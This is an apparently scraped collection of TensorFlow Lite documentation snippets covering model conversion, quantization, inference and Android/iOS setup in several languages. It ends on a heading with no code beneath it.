TITLE: Export TensorFlow Model (Python)
DESCRIPTION: Converts and exports the retrained model to various formats specified by `export_format`, such as TFLite, SavedModel, labels, and vocabulary files. The output files are saved to the specified directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_7

LANGUAGE: Python
CODE:
```
export(
    export_dir,
    tflite_filename='model.tflite',
    label_filename='labels.txt',
    vocab_filename='vocab.txt',
    saved_model_filename='saved_model',
    tfjs_folder_name='tfjs',
    export_format=None,
    **kwargs
)
```

----------------------------------------

TITLE: Running NLClassifier Inference Swift
DESCRIPTION: Initializes the TFLNLClassifier with model path and options like input/output tensor names. It then demonstrates how to call the classify method on an input string to get classification results as an array of categories.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/nl_classifier.md#_snippet_3

LANGUAGE: Swift
CODE:
```
// Initialization
var modelOptions:TFLNLClassifierOptions = TFLNLClassifierOptions()
modelOptions.inputTensorName = inputTensorName
modelOptions.outputScoreTensorName = outputScoreTensorName
let nlClassifier = TFLNLClassifier.nlClassifier(
      modelPath: modelPath,
      options: modelOptions)

// Run inference
let categories = nlClassifier.classify(text: input)
```

----------------------------------------

TITLE: Add TFLite Google Play Services Dependencies (Gradle)
DESCRIPTION: Configures the app's build.gradle file to include the necessary TensorFlow Lite libraries via Google Play Services, specifically adding the core Java library and the GPU delegate module. Requires a standard Android project setup using Gradle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
dependencies {
    ...
    implementation 'com.google.android.gms:play-services-tflite-java:16.0.1'
    implementation 'com.google.android.gms:play-services-tflite-gpu:16.1.0'
}
```

----------------------------------------

TITLE: Mapping TFLite Results to Labels with TensorLabel Java
DESCRIPTION: This Java snippet shows how to post-process the output results from a `TensorBuffer` using a `TensorProcessor` (e.g., for dequantization). It then uses the `TensorLabel` class to associate the processed results with a list of loaded category labels, providing a convenient `Map<String, Float>` to access inference probabilities by their corresponding label string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_6

LANGUAGE: Java
CODE:
```
import java.util.Map;
import org.tensorflow.lite.support.common.TensorProcessor;
import org.tensorflow.lite.support.common.ops.NormalizeOp;
import org.tensorflow.lite.support.label.TensorLabel;

// Post-processor which dequantize the result
TensorProcessor probabilityProcessor =
    new TensorProcessor.Builder().add(new NormalizeOp(0, 255)).build();

if (null != associatedAxisLabels) {
    // Map of labels and their corresponding probability
    TensorLabel labels = new TensorLabel(associatedAxisLabels,
        probabilityProcessor.process(probabilityBuffer));

    // Create a map to access the result based on label
    Map<String, Float> floatMap = labels.getMapWithFloatValue();
}
```

----------------------------------------

TITLE: Creating TFLiteConverter from SavedModel Directory (Python)
DESCRIPTION: This class method creates a `TFLiteConverter` object by loading a SavedModel from a specified directory (`saved_model_dir`). You can optionally specify `signature_keys` to select the relevant SignatureDef and `tags` to identify the desired MetaGraphDef within the SavedModel. The method returns a `TFLiteConverter` instance configured to convert the specified SavedModel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_9

LANGUAGE: Python
CODE:
```
@classmethod
from_saved_model(
    saved_model_dir, signature_keys=None, tags=None
)
```

----------------------------------------

TITLE: Initializing TFLiteConverter Python
DESCRIPTION: Initializes the TFLiteConverter object directly with a list of TensorFlow ConcreteFunctions and an optional trackable object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.lite.TFLiteConverter(
    funcs, trackable_obj=None
)
```

----------------------------------------

TITLE: Converting SavedModel RNN to TensorFlow Lite (Python)
DESCRIPTION: This snippet shows how to convert a TensorFlow model saved in the SavedModel format, containing one or more Keras LSTM layers, into a TensorFlow Lite model. It uses the TFLiteConverter.from_saved_model method, requiring the path to the SavedModel directory. The convert method then performs the conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/rnn.md#_snippet_0

LANGUAGE: Python
CODE:
```
# build a saved model. Here concrete_function is the exported function
# corresponding to the TensorFlow model containing one or more
# Keras LSTM layers.
saved_model, saved_model_dir = build_saved_model_lstm(...)
saved_model.save(saved_model_dir, save_format="tf", signatures=concrete_func)

# Convert the model.
converter = TFLiteConverter.from_saved_model(saved_model_dir)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Creating TFLiteConverter from ConcreteFunctions (Python)
DESCRIPTION: Use this class method to initialize a `TFLiteConverter` from a list of TensorFlow `ConcreteFunctions`. Optionally, you can provide an `AutoTrackable` object (`trackable_obj`) to ensure variables referenced by the functions are not garbage collected. The method returns a `TFLiteConverter` object; note that currently, it is primarily designed to convert a single ConcreteFunction.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_7

LANGUAGE: Python
CODE:
```
@classmethod
from_concrete_functions(
    funcs, trackable_obj=None
)
```

----------------------------------------

TITLE: Converting Keras Model to TFLite Python
DESCRIPTION: This code snippet converts the trained Keras model to a TensorFlow Lite model. It defines a concrete function with a fixed input shape (BATCH_SIZE, STEPS, INPUT_SIZE) to enable efficient conversion. The Keras model is first saved in TensorFlow SavedModel format, and then the TFLiteConverter is used to generate the TFLite model bytes from the SavedModel directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/Keras_LSTM_fusion_Codelab.ipynb#_snippet_4

LANGUAGE: Python
CODE:
```
run_model = tf.function(lambda x: model(x))
# This is important, let's fix the input size.
BATCH_SIZE = 1
STEPS = 28
INPUT_SIZE = 28
concrete_func = run_model.get_concrete_function(
    tf.TensorSpec([BATCH_SIZE, STEPS, INPUT_SIZE], model.inputs[0].dtype))

# model directory.
MODEL_DIR = "keras_lstm"
model.save(MODEL_DIR, save_format="tf", signatures=concrete_func)

converter = tf.lite.TFLiteConverter.from_saved_model(MODEL_DIR)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Creating Detailed Metadata Information Objects (Python)
DESCRIPTION: Loads the image classification model buffer. It then creates instances of `metadata_info.GeneralMd` for overall model details, `metadata_info.InputImageTensorMd` for input tensor specifics (including normalization, color space, and type), and `metadata_info.ClassificationTensorMd` for output tensor details (including labels). These objects encapsulate the rich semantic information to be added to the model's metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_20

LANGUAGE: Python
CODE:
```
model_buffer = writer_utils.load_file("mobilenet_v2_1.0_224.tflite")

# Create general model information.
general_md = metadata_info.GeneralMd(
    name="ImageClassifier",
    version="v1",
    description=("Identify the most prominent object in the image from a "
                 "known set of categories."),
    author="TensorFlow Lite",
    licenses="Apache License. Version 2.0")

# Create input tensor information.
input_md = metadata_info.InputImageTensorMd(
    name="input image",
    description=("Input image to be classified. The expected image is "
                 "128 x 128, with three channels (red, blue, and green) per "
                 "pixel. Each element in the tensor is a value between min and "
                 "max, where (per-channel) min is [0] and max is [255]."),
    norm_mean=[127.5],
    norm_std=[127.5],
    color_space_type=_metadata_fb.ColorSpaceType.RGB,
    tensor_type=writer_utils.get_input_tensor_types(model_buffer)[0])

# Create output tensor information.
output_md = metadata_info.ClassificationTensorMd(
    name="probability",
    description="Probabilities of the 1001 labels respectively.",
    label_files=[
        metadata_info.LabelFileMd(file_path="mobilenet_labels.txt",
                                  locale="en")
    ],
    tensor_type=writer_utils.get_output_tensor_types(model_buffer)[0])
```

----------------------------------------

TITLE: Setting Basic ObjectDetector Options (Kotlin)
DESCRIPTION: Initializes a builder for `ObjectDetectorOptions` and configures key parameters such as the minimum confidence `threshold` for detections and the maximum number of `maxResults` to return. This builder is used to create the final `ObjectDetector` instance. Requires the `tensorflow-lite-task-vision` dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_5

LANGUAGE: Kotlin
CODE:
```
val optionsBuilder =
  ObjectDetector.ObjectDetectorOptions.builder()
    .setScoreThreshold(threshold)
    .setMaxResults(maxResults)
```

----------------------------------------

TITLE: Train Audio Classification Model with Model Maker in Python
DESCRIPTION: This snippet trains the audio classification model using TensorFlow Lite Model Maker's `create` function. It takes the training data, model specification, validation data, batch size, and number of epochs as inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
# If your dataset has fewer than 100 samples per class,
# you might want to try a smaller batch size
batch_size = 25
epochs = 25
model = audio_classifier.create(train_data, spec, validation_data, batch_size, epochs)
```

----------------------------------------

TITLE: Converting Keras Model to TFLite Python
DESCRIPTION: Initializes the TensorFlow Lite Converter from the previously trained Keras model. It then performs the conversion to the TFLite flatbuffer format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Applying Full Integer Quantization (Integer Only, Python)
DESCRIPTION: This snippet extends full integer quantization by enforcing compatibility with integer-only hardware. It sets `optimizations` to `DEFAULT`, provides a `representative_dataset`, restricts supported operations to `TFLITE_BUILTINS_INT8`, and explicitly sets the `inference_input_type` and `inference_output_type` to `tf.int8` (or `tf.uint8`). This ensures all model components are integer-based.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_5

LANGUAGE: Python
CODE:
```
import tensorflow as tf
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.representative_dataset = representative_dataset
converter.target_spec.supported_ops = [tf.lite.OpsSet.TFLITE_BUILTINS_INT8]
converter.inference_input_type = tf.int8  # or tf.uint8
converter.inference_output_type = tf.int8  # or tf.uint8
tflite_quant_model = converter.convert()
```

----------------------------------------

TITLE: Converting Keras Model to TFLite with Default Signature - Python
DESCRIPTION: Creates a simple Keras Sequential model and converts it to a TFLite model using TFLiteConverter.from_keras_model. This converter method automatically identifies and converts the default signature from the Keras model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_3

LANGUAGE: Python
CODE:
```
# Generate a Keras model.
keras_model = tf.keras.Sequential(
    [
        tf.keras.layers.Dense(2, input_dim=4, activation='relu', name='x'),
        tf.keras.layers.Dense(1, activation='relu', name='output'),
    ]
)

# Convert the keras model using TFLiteConverter.
# Keras model converter API uses the default signature automatically.
converter = tf.lite.TFLiteConverter.from_keras_model(keras_model)
tflite_model = converter.convert()

# Print the signatures from the converted model
interpreter = tf.lite.Interpreter(model_content=tflite_model)

signatures = interpreter.get_signature_list()
print(signatures)
```

----------------------------------------

TITLE: Enable GPU Acceleration with Task Library (Standalone) - Kotlin
DESCRIPTION: Configures the BaseOptions for a Task API model (like ObjectDetector) to use the GPU delegate directly from the standalone TensorFlow Lite library plugin. It then demonstrates creating an ObjectDetector instance with these options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_task.md#_snippet_4

LANGUAGE: Kotlin
CODE:
```
import org.tensorflow.lite.task.core.BaseOptions
    import org.tensorflow.lite.task.gms.vision.detector.ObjectDetector

    val baseOptions = BaseOptions.builder().useGpu().build()

    val options =
        ObjectDetector.ObjectDetectorOptions.builder()
            .setBaseOptions(baseOptions)
            .setMaxResults(1)
            .build()

    val objectDetector = ObjectDetector.createFromFileAndOptions(
      context, model, options)
```

----------------------------------------

TITLE: Converting ResNet to Float TFLite Python
DESCRIPTION: Uses the previously initialized converter for the ResNet-v2-101 model to perform the standard (float) conversion to TensorFlow Lite format. The resulting float model's byte content is then written to a file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
# Convert to TF Lite without quantization
resnet_tflite_file = tflite_models_dir/"resnet_v2_101.tflite"
resnet_tflite_file.write_bytes(converter.convert())
```

----------------------------------------

TITLE: Loading Default Float TFLite Model Interpreter Python
DESCRIPTION: Initializes a TensorFlow Lite Interpreter using the file path of the default float32 TFLite model. It then allocates tensors required for inference, preparing the interpreter for execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_path=str(tflite_model_file))
interpreter.allocate_tensors()
```

----------------------------------------

TITLE: Running TFLite Inference Multiple Inputs/Outputs Java
DESCRIPTION: Executes a TensorFlow Lite model that accepts multiple inputs and produces multiple outputs. It requires an array or collection of input data and a map to specify where to place the corresponding output data by tensor index. Input order must match the converter output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_4

LANGUAGE: Java
CODE:
```
interpreter.runForMultipleInputsOutputs(inputs, map_of_indices_to_outputs);
```

----------------------------------------

TITLE: Handling TFLite Classification Results (Kotlin)
DESCRIPTION: Defines a listener object that processes the classification results provided by the AudioClassifier. The onResult callback receives a list of categorized predictions and the inference duration. It updates the application's user interface elements, such as a list adapter and a text view displaying processing time, ensuring UI modifications happen safely on the main thread.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_13

LANGUAGE: kotlin
CODE:
```
private val audioClassificationListener = object : AudioClassificationListener {
  override fun onResult(results: List<Category>, inferenceTime: Long) {
    requireActivity().runOnUiThread {
      adapter.categoryList = results
      adapter.notifyDataSetChanged()
      fragmentAudioBinding.bottomSheetLayout.inferenceTimeVal.text =
        String.format("%d ms", inferenceTime)
    }
  }
}
```

----------------------------------------

TITLE: Running Style Transform Model with TensorFlow Lite (Python)
DESCRIPTION: Defines the `run_style_transform` function which loads the style transform TensorFlow Lite model. It initializes the TFLite interpreter, sets both the style bottleneck vector and the preprocessed content image as input tensors, runs inference, and retrieves the output tensor which is the stylized image. This model applies the predicted style to the content image. Requires the TensorFlow Lite interpreter, the style bottleneck vector (shape 1x100), and the preprocessed content image (shape 1x384x384x3).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
# Run style transform on preprocessed style image
def run_style_transform(style_bottleneck, preprocessed_content_image):
  # Load the model.
  interpreter = tf.lite.Interpreter(model_path=style_transform_path)

  # Set model input.
  input_details = interpreter.get_input_details()
  interpreter.allocate_tensors()

  # Set model inputs.
  interpreter.set_tensor(input_details[0]["index"], preprocessed_content_image)
  interpreter.set_tensor(input_details[1]["index"], style_bottleneck)
  interpreter.invoke()

  # Transform content image.
  stylized_image = interpreter.tensor(
      interpreter.get_output_details()[0]["index"]
      )()

  return stylized_image

# Stylize the content image using the style bottleneck.
stylized_image = run_style_transform(style_bottleneck, preprocessed_content_image)

# Visualize the output.
imshow(stylized_image, 'Stylized Image')
```

----------------------------------------

TITLE: Initializing Quantized Tensors in TensorFlow Lite Java
DESCRIPTION: Demonstrates how to create a TensorImage for input and a fixed-size TensorBuffer for output, both specified with the DataType.UINT8 for representing quantized data in TensorFlow Lite. This is required when working with models that use UINT8 quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_8

LANGUAGE: java
CODE:
```
TensorImage tensorImage = new TensorImage(DataType.UINT8);
TensorBuffer probabilityBuffer =
    TensorBuffer.createFixedSize(new int[]{1, 1001}, DataType.UINT8);
```

----------------------------------------

TITLE: Run TFLite Model (with Pre/Post) Python
DESCRIPTION: This snippet runs the TFLite model that was exported with integrated pre/post-processing. It calls the `run_tflite_model` function with the converted `tflite_model` content and the raw input image tensor. The output is the result of the post-processing step (argmax), which is then printed as the predicted class label.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
output_data = run_tflite_model(tflite_model, raw_image_tensor)
print("Predicted class:", model.config.id2label[output_data[0]])
```

----------------------------------------

TITLE: Adding TensorFlowLiteObjC Pod Ruby
DESCRIPTION: Adds the official TensorFlowLiteObjC CocoaPods dependency to your project's Podfile. This specifies the library needed for integrating TensorFlow Lite using CocoaPods.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_1

LANGUAGE: ruby
CODE:
```
pod 'TensorFlowLiteObjC'
```

----------------------------------------

TITLE: Add TFLite Swift Pod with CocoaPods (Ruby)
DESCRIPTION: Specifies the TensorFlowLiteSwift pod dependency in a CocoaPods Podfile, enabling framework usage for Swift projects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_0

LANGUAGE: Ruby
CODE:
```
use_frameworks!
pod 'TensorFlowLiteSwift'
```

----------------------------------------

TITLE: Perform Single Training Step - TensorFlow Python
DESCRIPTION: Defines a single training step for the custom training loop using TensorFlow's `tf.GradientTape`. It computes the loss for a batch, calculates gradients with respect to the model's trainable weights, and applies these gradients using the optimizer. Requires a defined `model`, `loss_fn`, and `optimizer` instances.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_32

LANGUAGE: python
CODE:
```
@tf.function
def train_step(inp, target):
  with tf.GradientTape() as tape:
    # tape.watch(tf.nest.flatten(weights))
    predictions = model(inp)
    loss = tnp.mean(loss_fn(target, predictions))
  weights = model.weights
  grads = tape.gradient(loss, weights)
  optimizer.apply_gradients(weights, grads)
  return loss
```

----------------------------------------

TITLE: Adding TFLite GPU Delegate Dependency (Gradle)
DESCRIPTION: Adds the necessary dependency for using the TensorFlow Lite GPU delegate in an Android project's build.gradle file. This dependency is required for accelerating model inference on compatible devices.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
    dependencies {
        ...
        // TFLite GPU delegate 2.3.0 or above is required.
        implementation 'org.tensorflow:tensorflow-lite-gpu:2.3.0'
    }
```

----------------------------------------

TITLE: Initializing Gemma2 CausalLM from Preset (Python)
DESCRIPTION: Initializes an instance of the `GemmaCausalLM` model from the `keras_nlp.models` module using a predefined preset string, specifically 'gemma2_2b_en' in this example. This line is typically found in a script like `benchmark.py` and can be modified to load different Gemma2 model variations by changing the preset string (e.g., 'gemma2_instruct_2b_en', 'gemma2_9b_en'). Requires the `keras-nlp` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/backends/cpu/benchmarks/e2e/gemma2/keras/README.md#_snippet_3

LANGUAGE: python
CODE:
```
gemma_lm = keras_nlp.models.GemmaCausalLM.from_preset("gemma2_2b_en")
```

----------------------------------------

TITLE: Splitting Training Data - Python
DESCRIPTION: Loads the training dataset using the `load_pose_landmarks` function. It then splits the loaded data (`X`, `y`) into training (85%) and validation (15%) subsets (`X_train`, `y_train`, `X_val`, `y_val`) using `train_test_split` for model evaluation during training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
# Load the train data
X, y, class_names, _ = load_pose_landmarks(csvs_out_train_path)

# Split training data (X, y) into (X_train, y_train) and (X_val, y_val)
X_train, X_val, y_train, y_val = train_test_split(X, y,
                                                  test_size=0.15)
```

----------------------------------------

TITLE: Converting a TensorFlow SavedModel to TFLite
DESCRIPTION: This command demonstrates the basic usage of `tflite_convert` to convert a TensorFlow SavedModel directory into a TensorFlow Lite model file. It requires specifying the input SavedModel directory and the desired output file path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_1

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --saved_model_dir=/tmp/saved_model \
  --output_file=/tmp/foo.tflite
```

----------------------------------------

TITLE: Performing Inference with TFLite Interpreter in Python
DESCRIPTION: Shows a basic inference workflow using the TFLite interpreter. It retrieves input and output tensor details, prepares input data, sets the input tensor, invokes the interpreter, and finally retrieves the shape of the output tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_3

LANGUAGE: python
CODE:
```
output = interpreter.get_output_details()[0]
input = interpreter.get_input_details()[0]
input_data = tf.constant(1., shape=[1, 1])
interpreter.set_tensor(input['index'], input_data)
interpreter.invoke()
interpreter.get_tensor(output['index']).shape
```

----------------------------------------

TITLE: Running TFLite Inference with SignatureDef in Python
DESCRIPTION: Demonstrates converting a TensorFlow SavedModel with a defined SignatureDef to TFLite and then running inference using the Python `tf.lite.Interpreter`. It shows how to use the `get_signature_runner` method to invoke the model by its signature.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_16

LANGUAGE: Python
CODE:
```
class TestModel(tf.Module):
  def __init__(self):
    super(TestModel, self).__init__()

  @tf.function(input_signature=[tf.TensorSpec(shape=[1, 10], dtype=tf.float32)])
  def add(self, x):
    '''
    Simple method that accepts single input 'x' and returns 'x' + 4.
    '''
    # Name the output 'result' for convenience.
    return {'result' : x + 4}


SAVED_MODEL_PATH = 'content/saved_models/test_variable'
TFLITE_FILE_PATH = 'content/test_variable.tflite'

# Save the model
module = TestModel()
# You can omit the signatures argument and a default signature name will be
# created with name 'serving_default'.
tf.saved_model.save(
    module, SAVED_MODEL_PATH,
    signatures={'my_signature':module.add.get_concrete_function()})

# Convert the model using TFLiteConverter
converter = tf.lite.TFLiteConverter.from_saved_model(SAVED_MODEL_PATH)
tflite_model = converter.convert()
with open(TFLITE_FILE_PATH, 'wb') as f:
  f.write(tflite_model)

# Load the TFLite model in TFLite Interpreter
interpreter = tf.lite.Interpreter(TFLITE_FILE_PATH)
# There is only 1 signature defined in the model,
# so it will return it by default.
# If there are multiple signatures then we can pass the name.
my_signature = interpreter.get_signature_runner()

# my_signature is callable with input as arguments.
output = my_signature(x=tf.constant([1.0], shape=(1,10), dtype=tf.float32))
# 'output' is dictionary with all outputs from the inference.
# In this case we have single output 'result'.
print(output['result'])
```

----------------------------------------

TITLE: Running TFLite Model Inference (Python)
DESCRIPTION: Demonstrates how to load a TensorFlow Lite model (represented as bytes) into a TFLite Interpreter, allocate tensors, set input data, invoke the interpreter, and retrieve the output. This is used to verify the converted model works correctly. Requires the TensorFlow Lite interpreter library. Input is the TFLite model and input data; output is the model's inference result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/overview.md#_snippet_3

LANGUAGE: Python
CODE:
```
# Run the model with TensorFlow Lite
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors() input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()
interpreter.set_tensor(input_details[0]["index"], input_data)
interpreter.invoke()
result = interpreter.get_tensor(output_details[0]["index"])
```

----------------------------------------

TITLE: Creating and Training Model (Python)
DESCRIPTION: Creates a custom question answering model instance and initiates the fine-tuning process using the loaded training data (`train_data`) and model specification (`spec`). The `question_answer.create` function handles the model architecture setup and training loop based on default parameters from the spec.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
model = question_answer.create(train_data, model_spec=spec)
```

----------------------------------------

TITLE: Integrating GPU Delegate with TFLite Interpreter C++
DESCRIPTION: This snippet demonstrates the basic workflow for integrating the GPU delegate with a standard TensorFlow Lite interpreter in C++. It shows how to create the delegate using `TfLiteGpuDelegateV2Create`, apply it to the interpreter graph with `ModifyGraphWithDelegate`, and clean up by deleting the delegate using `TfLiteGpuDelegateV2Delete` after inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_0

LANGUAGE: cpp
CODE:
```
// Set up interpreter.
auto model = FlatBufferModel::BuildFromFile(model_path);
if (!model) return false;
ops::builtin::BuiltinOpResolver op_resolver;
std::unique_ptr<Interpreter> interpreter;
InterpreterBuilder(*model, op_resolver)(&interpreter);

// NEW: Prepare GPU delegate.
auto* delegate = TfLiteGpuDelegateV2Create(/*default options=*/nullptr);
if (interpreter->ModifyGraphWithDelegate(delegate) != kTfLiteOk) return false;

// Run inference.
WriteToInputTensor(interpreter->typed_input_tensor<float>(0));
if (interpreter->Invoke() != kTfLiteOk) return false;
ReadFromOutputTensor(interpreter->typed_input_tensor<float>(0));

// NEW: Clean up.
TfLiteGpuDelegateV2Delete(delegate);
```

----------------------------------------

TITLE: Displaying Detection Results on UI Overlay - TensorFlow Lite - Kotlin
DESCRIPTION: Implements the `onResults` callback method within the CameraFragment to handle the detection results received from the helper. It updates a UI element displaying the inference time and passes the detection results and image dimensions to an `OverlayView` component responsible for drawing visual indicators like bounding boxes on top of the camera preview. Finally, it forces the overlay view to redraw.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_15

LANGUAGE: Kotlin
CODE:
```
override fun onResults(
  results: MutableList<Detection>?,
  inferenceTime: Long,
  imageHeight: Int,
  imageWidth: Int
) {
    activity?.runOnUiThread {
        fragmentCameraBinding.bottomSheetLayout.inferenceTimeVal.text =
            String.format("%d ms", inferenceTime)

        // Pass necessary information to OverlayView for drawing on the canvas
        fragmentCameraBinding.overlay.setResults(
            results ?: LinkedList<Detection>(),
            imageHeight,
            imageWidth
        )

        // Force a redraw
        fragmentCameraBinding.overlay.invalidate()
    }
}
```

----------------------------------------

TITLE: Start TFLite Delegate Latency Benchmark Android ADB
DESCRIPTION: Launches the TensorFlow Lite delegate performance latency benchmark activity on a connected Android device using `adb shell am start`. It requires the `--tflite_settings_files` flag to specify the path to the benchmark settings JSON file on the device. The `-S` flag stops the target activity before starting it.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_9

LANGUAGE: ADB Shell
CODE:
```
adb shell "am start -S \
 -n org.tensorflow.lite.benchmark.delegateperformance/org.tensorflow.lite.benchmark.delegateperformance.BenchmarkLatencyActivity \
 --esa --tflite_settings_files '/data/local/tmp/stable_delegate_settings.json'"
```

----------------------------------------

TITLE: Verifying TFLite Model Predictions Python
DESCRIPTION: This snippet loads the converted TFLite model using the TensorFlow Lite Interpreter. It then iterates through a few test cases, runs predictions using both the original Keras model and the TFLite interpreter, and uses NumPy's assert_almost_equal to verify that the results are consistent within a specified decimal tolerance. It also demonstrates resetting interpreter states.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/Keras_LSTM_fusion_Codelab.ipynb#_snippet_5

LANGUAGE: Python
CODE:
```
# Run the model with TensorFlow to get expected results.
TEST_CASES = 10

# Run the model with TensorFlow Lite
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()

for i in range(TEST_CASES):
  expected = model.predict(x_test[i:i+1])
  interpreter.set_tensor(input_details[0]["index"], x_test[i:i+1, :, :])
  interpreter.invoke()
  result = interpreter.get_tensor(output_details[0]["index"])

  # Assert if the result of TFLite model is consistent with the TF model.
  np.testing.assert_almost_equal(expected, result, decimal=5)
  print("Done. The result of TensorFlow matches the result of TensorFlow Lite.")

  # Please note: TfLite fused Lstm kernel is stateful, so we need to reset
  # the states.
  # Clean up internal states.
  interpreter.reset_all_variables()
```

----------------------------------------

TITLE: Add TFLite Objective-C Pod with CocoaPods (Ruby)
DESCRIPTION: Specifies the TensorFlowLiteObjC pod dependency in a CocoaPods Podfile for Objective-C projects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_1

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteObjC'
```

----------------------------------------

TITLE: Install TensorFlow Lite Runtime Python Package
DESCRIPTION: This command installs the lightweight `tflite-runtime` Python package using pip. It's designed for embedded Linux devices and includes only the necessary components to run TensorFlow Lite models, significantly reducing installation size compared to the full TensorFlow package.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/python.md#_snippet_0

LANGUAGE: bash
CODE:
```
python3 -m pip install tflite-runtime
```

----------------------------------------

TITLE: Running TFLite Inference Single Input/Output Java
DESCRIPTION: Executes a TensorFlow Lite model that has exactly one input and one output. It takes the input data directly and a container for the single output data. This method is a simplified approach for basic models without complex input/output structures or signatures and is used when signatures are not defined.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_3

LANGUAGE: Java
CODE:
```
try (Interpreter interpreter = new Interpreter(file_of_a_tensorflowlite_model)) {
  interpreter.run(input, output);
}
```

----------------------------------------

TITLE: Loading Image Data from Folder (from_folder) - Python
